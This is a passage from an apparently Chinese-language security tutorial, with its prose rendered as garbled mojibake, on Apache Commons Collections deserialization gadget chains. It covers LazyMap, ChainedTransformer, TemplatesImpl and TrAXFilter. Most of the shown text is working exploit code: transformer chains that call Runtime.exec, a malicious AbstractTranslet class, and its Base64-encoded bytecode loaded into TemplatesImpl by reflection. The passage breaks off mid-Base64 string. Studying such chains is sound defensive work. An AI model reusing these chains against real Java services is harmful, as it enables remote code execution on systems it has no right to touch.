class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æµ‹è¯• LazyMap</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">     <span class="comment">//Transformeræ•°ç»„</span></span><br><span class="line">     Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">     &#125;;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//ChainedTransformerå®ä¾‹</span></span><br><span class="line">     <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">     <span class="type">Map</span> <span class="variable">uselessMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">     <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(uselessMap, chainedTransformer);</span><br><span class="line">     lazyMap.get(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></blockquote><h4 id="TemplatesImplï¼ˆé‡è¦ï¼‰"><a href="#TemplatesImplï¼ˆé‡è¦ï¼‰" class="headerlink" title="TemplatesImplï¼ˆé‡è¦ï¼‰"></a>TemplatesImplï¼ˆé‡è¦ï¼‰</h4><p>è¿™ä¸ªç±»ä¸åœ¨ Apache Commons Collections ä¸­ã€‚ä½†æ˜¯ TemplatesImpl è¿™ä¸ªç±»å¾ˆç‰¹æ®Šï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©å…¶åŠ¨æ€åŠ è½½åŒ…å«æ¶æ„çš„å­—èŠ‚ç ï¼Œéƒ¨åˆ†ç®€åŒ–ä»£ç å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title class_">Templates</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">_name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å…³é”®æ–¹æ³•ï¼šnewTransformer()</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">                <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">            &#123;</span><br><span class="line">                TransformerImpl transformer;</span><br><span class="line">                <span class="comment">// å…³é”®ç‚¹ï¼Œè°ƒç”¨ getTransletInstance()</span></span><br><span class="line">                transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">                    _indentNumber, _tfactory);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//ç»§ç»­è·Ÿè¿› getTransletInstance() æ–¹æ³•ï¼š</span></span><br><span class="line">    <span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//å…ˆåˆ¤æ–­æ˜¯å¦ä¸º nullï¼Œå¦‚æœä¸º null çš„è¯å»åŠ è½½å­—èŠ‚ç ï¼Œç´§æ¥ç€ newInstance() å¯¹å…¶å®ä¾‹åŒ–ã€‚</span></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            â€¦â€¦â€¦â€¦</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ç»§ç»­è·Ÿè¿› defineTransletClasses() æ–¹æ³•:</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        â€¦â€¦â€¦â€¦</span><br><span class="line">        <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        â€¦â€¦â€¦â€¦</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);  <span class="comment">//å…³é”®ç‚¹</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ç»§ç»­è·Ÿè¿› TransletClassLoaderï¼Œè¿™ä¸ªç±»é‡Œé‡å†™äº† defineClass æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">            <span class="built_in">super</span>(parent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);   <span class="comment">//å…³é”®ç‚¹</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æ¶æ„å­—èŠ‚ç çš„ç”Ÿæˆï¼š<br>HelloTemplatesImpl.javaï¼Œä¸»è¦å…¶å¿…é¡»ç»§æ‰¿ AbstractTranslet ç±»ï¼Œ</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HelloTemplatesImpl.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloTemplatesImpl</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æˆ‘ä»¬å°†å…¶ç¼–è¯‘ä¸º HelloTemplatesImpl.classï¼Œç„¶åè¿›è¡Œ Base64 ç¼–ç ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj</span><br></pre></td></tr></table></figure></div><p>æµ‹è¯•</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æµ‹è¯• TemplatesImpl</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="comment">//æ¶æ„å­—èŠ‚ç </span></span><br><span class="line">        <span class="type">byte</span>[] code = Base64.decode(<span class="string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¼¹è®¡ç®—å™¨</span></span><br></pre></td></tr></table></figure></div><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€ä¼ å…¥æ¶æ„å­—èŠ‚ç ç»™ TemplatesImplï¼Œç„¶åè°ƒç”¨å…¶ newTransformer æ–¹æ³•ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰ç±»å¯ä»¥è°ƒç”¨ TemplatesImpl.newTransformer()ï¼Œè¿™é‡Œå…ˆä»‹ç»ä¸€ä¸ªæ„é€  CC3 ä¸­å°†ä¼šç”¨åˆ°çš„ç±» TrAXFilterï¼Œä¸‹é¢æ˜¯å…¶æ„é€ å‡½æ•°ï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrAXFilter</span> <span class="keyword">extends</span> <span class="title class_">XMLFilterImpl</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">        TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();    <span class="comment">//å…³é”®ç‚¹</span></span><br><span class="line">        â€¦â€¦â€¦â€¦</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æµ‹è¯•</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æµ‹è¯• TrAXFilter</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="comment">//å­—èŠ‚ç </span></span><br><span class="line">        <span class="type">byte</span>[] code = Base64.decode(<span class="string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEA